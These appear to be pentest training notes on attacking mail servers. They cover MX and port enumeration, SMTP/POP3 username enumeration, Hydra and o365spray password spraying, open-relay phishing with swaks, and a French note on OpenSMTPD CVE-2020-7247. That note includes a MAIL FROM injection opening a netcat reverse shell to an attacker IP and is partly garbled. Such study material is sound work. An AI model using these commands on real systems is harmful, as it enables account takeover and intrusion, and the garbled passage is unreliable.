# Attacking Email Services

***

**A `mail server`** (sometimes also referred to as an email server) is a server that **handles and delivers email over a network**, usually over the Internet. A mail server can receive emails from a client device and send them to other mail servers. A mail server can also deliver emails to a client device. A client is usually the device where we read our emails (computers, smartphones, etc.).

When we press the `Send` button in our email application (email client), the program establishes a connection to an <mark style="color:orange;">**`SMTP`**</mark> server on the network or Internet. The name <mark style="color:orange;">**`SMTP`**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**stands for Simple Mail Transfer Protocol**</mark><mark style="color:orange;">,</mark> and it is a protocol for delivering emails from clients to servers and from servers to other servers.

When we download emails to our email application, it will connect to a <mark style="color:orange;">**`POP3`**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**or**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**`IMAP4`**</mark> server on the Internet, which allows the user to save messages in a server mailbox and download them periodically.

By default, `POP3` clients remove downloaded messages from the email server. This behavior makes it difficult to access email on multiple devices since downloaded messages are stored on the local computer. However, we can typically configure a `POP3` client to keep copies of downloaded messages on the server.

![text](https://academy.hackthebox.com/storage/modules/116/SMTP-IMAP-1.png)

***

### <mark style="color:blue;">Enumeration</mark>

Email servers are complex and usually require us to enumerate multiple servers, ports, and services. Furthermore, today most companies have their email services in the cloud with services such as [Microsoft 365](https://www.microsoft.com/en-ww/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook) or [G-Suite](https://workspace.google.com/solutions/new-business/). Therefore, our approach to attacking the email service depends on the service in use.

We can use the `Mail eXchanger` (`MX`) DNS record to identify a mail server. The MX record specifies the mail server responsible for accepting email messages on behalf of a domain name. It is possible to configure several MX records, typically pointing to an array of mail servers for load balancing and redundancy.

#### <mark style="color:green;">**Host - MX Records**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ host -t MX hackthebox.eu

hackthebox.eu mail is handled by 1 aspmx.l.google.com.
```

```shell-session
mrroboteLiot@htb[/htb]$ host -t MX microsoft.com

microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.
```

#### <mark style="color:green;">**DIG - MX Records**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ dig mx plaintext.do | grep "MX" | grep -v ";"

plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
plaintext.do.           7076    IN      MX      10 mx.zoho.com.
plaintext.do.           7076    IN      MX      20 mx2.zoho.com.
```

```shell-session
mrroboteLiot@htb[/htb]$ dig mx inlanefreight.com | grep "MX" | grep -v ";"

inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.
```

#### <mark style="color:green;">**Host - A Records**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ host -t A mail1.inlanefreight.htb.

mail1.inlanefreight.htb has address 10.129.14.128
```

These `MX` records indicate that the first three mail services are using a cloud services G-Suite (aspmx.l.google.com), Microsoft 365 (microsoft-com.mail.protection.outlook.com), and Zoho (mx.zoho.com), and the last one may be a custom mail server hosted by the companyIf we are targetting a custom mail server implementation such as `inlanefreight.htb`, we can enumerate the following ports:

<table data-header-hidden data-full-width="true"><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>Port</strong></td><td><strong>Service</strong></td></tr><tr><td><code>TCP/25</code></td><td>SMTP Unencrypted</td></tr><tr><td><code>TCP/143</code></td><td>IMAP4 Unencrypted</td></tr><tr><td><code>TCP/110</code></td><td>POP3 Unencrypted</td></tr><tr><td><code>TCP/465</code></td><td>SMTP Encrypted</td></tr><tr><td><code>TCP/587</code></td><td>SMTP Encrypted/<a href="https://en.wikipedia.org/wiki/Opportunistic_TLS">STARTTLS</a></td></tr><tr><td><code>TCP/993</code></td><td>IMAP4 Encrypted</td></tr><tr><td><code>TCP/995</code></td><td>POP3 Encrypted</td></tr></tbody></table>

We can use `Nmap`'s default script `-sC` option to enumerate those ports on the target system

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00025s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
MAC Address: 00:00:00:00:00:00 (VMware)
```
{% endcode %}

***

### <mark style="color:blue;">Misconfigurations</mark>

Email services use authentication to allow users to send emails and receive emails. A misconfiguration can happen when the SMTP service allows anonymous authentication or support protocols that can be used to enumerate valid usernames.

#### <mark style="color:green;">**Authentication**</mark>

The SMTP server has different commands that can be used to enumerate valid usernames `VRFY`, `EXPN`, and `RCPT TO`. If we successfully enumerate valid usernames, we can attempt to password spray, brute-forcing, or guess a valid password. So let's explore how those commands work.

`VRFY` this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.

<mark style="color:orange;">**VRFY Command**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


VRFY root

252 2.0.0 root


VRFY www-data

252 2.0.0 www-data


VRFY new-user

550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```
{% endcode %}

`EXPN` is similar to `VRFY`, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the `VRFY` command since sites often have an alias such as "all."

<mark style="color:orange;">**EXPN Command**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


EXPN john

250 2.1.0 john@inlanefreight.htb


EXPN support-team

250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```

`RCPT TO` identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.

<mark style="color:orange;">**RCPT TO Command**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok


RCPT TO:julio

550 5.1.1 julio... User unknown


RCPT TO:kate

550 5.1.1 kate... User unknown


RCPT TO:john

250 2.1.5 john... Recipient ok
```

We can also use the `POP3` protocol to enumerate users depending on the service implementation. For example, we can use the command `USER` followed by the username, and if the server responds `OK`. This means that the user exists on the server.

<mark style="color:orange;">**USER Command**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ telnet 10.10.110.20 110

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
+OK POP3 Server ready

USER julio

-ERR


USER john

+OK
```
{% endcode %}

To automate our enumeration process, we can use a tool named [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum). We can specify the enumeration mode with the argument `-M` followed by `VRFY`, `EXPN`, or `RCPT`, and the argument `-U` with a file containing the list of users we want to enumerate. Depending on the server implementation and enumeration mode, we need to add the domain for the email address with the argument `-D`. Finally, we specify the target with the argument `-t`.

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

```
{% endcode %}

***

### <mark style="color:blue;">Cloud Enumeration</mark>

As discussed, cloud service providers use their own implementation for email services. Those services commonly have custom features that we can abuse for operation, such as username enumeration. Let's use Office 365 as an example and explore how we can enumerate usernames in this cloud platform.

[O365spray](https://github.com/0xZDH/o365spray) is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365) developed by [ZDH](https://twitter.com/0xzdh). This tool reimplements a collection of enumeration and spray techniques researched and identified by those mentioned in [Acknowledgments](https://github.com/0xZDH/o365spray#Acknowledgments). Let's first validate if our target domain is using Office 365.

**O365 Spray**

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ python3 o365spray.py --validate --domain msplaintext.xyz
```
{% endcode %}

Now, we can attempt to identify usernames.

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz                                               
```
{% endcode %}

***

### <mark style="color:blue;">Password Attacks</mark>

We can use `Hydra` to perform a password spray or brute force against email services such as `SMTP`, `POP3`, or `IMAP4`. First, we need to get a username list and a password list and specify which service we want to attack. Let us see an example for `POP3`.

#### <mark style="color:green;">**Hydra - Password Attack**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```
{% endcode %}

If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like `Hydra`, but these tools are usually blocked. We can instead try to use custom tools such as [o365spray](https://github.com/0xZDH/o365spray) or [MailSniper](https://github.com/dafthack/MailSniper) for Microsoft Office 365 or [CredKing](https://github.com/ustayready/CredKing) for Gmail or Okta. Keep in mind that these tools need to be up-to-date because if the service provider changes something&#x20;

#### <mark style="color:green;">**O365 Spray - Password Spraying**</mark>

{% code overflow="wrap" fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```
{% endcode %}

***

### <mark style="color:blue;">Protocol Specifics Attacks</mark>

An open relay is a Simple Mail Transfer Protocol (`SMTP`) server, which is improperly configured and allows an unauthenticated email relay. Messaging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. This behavior masks the source of the messages and makes it look like the mail originated from the open relay server.

#### <mark style="color:green;">**Open Relay**</mark>

From an attacker's standpoint, we can abuse this for phishing by sending emails as non-existing users or spoofing someone else's email. For example, imagine we are targeting an enterprise with an open relay mail server, and we identify they use a specific email address to send notifications to their employees. We can send a similar email using the same address and add our phishing link with this information. With the `nmap smtp-open-relay` script, we can identify if an SMTP port allows an open relay.

```shell-session
mrroboteLiot@htb[/htb]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT
Nmap scan report for 10.10.11.213
Host is up (0.28s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)
```

Next, we can use any mail client to connect to the mail server and send our email.

{% code overflow="wrap" fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```
{% endcode %}

***

{% hint style="warning" %}
<mark style="color:orange;">**Fiche Technique : Vulnérabilité OpenSMTPD (CVE-2020-7247)**</mark>

**1. Introduction**\
La vulnérabilité CVE-2020-7247 est une faille critique d'exécution de code à distance (RCE) dans OpenSMTPD jusqu'à la version 6.6.2. Cette vulnérabilité, exploitable depuis 2018, permet d'exécuter des commandes système sans authentification. OpenSMTPD est un service SMTP open source largement utilisé dans de nombreuses distributions Linux (Debian, Fedora, FreeBSD, etc.).

***

**2. Détails Techniques**

* **Nom de la vulnérabilité :** CVE-2020-7247
* **Type :** Exécution de code à distance (RCE)
* **Versions affectées :** OpenSMTPD jusqu'à la version 6.6.2
* **Gravité :** Critique
* **Mécanisme :**
  * La vulnérabilité repose sur une faille dans la fonction d'enregistrement de l'adresse e-mail de l'expéditeur.
  * L'exploitation est possible en injectant des commandes via le champ `MAIL FROM` en utilisant le caractère point-virgule (`;`).
  * Limite de 64 caractères pour l'injection de commandes.

**3. Processus de l'attaque**

1.  **Connexion initiale :**

    * Se connecter au service SMTP de la cible via Telnet ou un script automatisé.

    ```
    telnet [IP] 25
    ```
2.  **Composition du message :**

    * Créer un e-mail avec des champs `MAIL FROM` et `RCPT TO`.
    * Injecter une commande dans le champ `MAIL FROM`.

    ```
    Ma
    ```
3. **isc  etait quoi la failli qui epormettait d faire ca MAIL FROM:<; /bin/bash -c 'nc -e /bin/sh \[AttackerIP] 4444'>**
4. **Exécution de la commande :**
   * L'interprétation incorrecte du `;` permet l'exécution directe de la commande.

***

**4. Cycle d'Exécution du Code à Distance (RCE)**

1. **Source :** Entrée de l'utilisateur (manuelle ou automatisée) via Telnet ou script.
2. **Processus :** OpenSMTPD traite l'e-mail et l'analyse.
3. **Privilèges :** L'e-mail est traité par OpenSMTPD avec des privilèges élevés (root).
4. **Destination :** La commande injectée est exécutée sur le système distant.
{% endhint %}
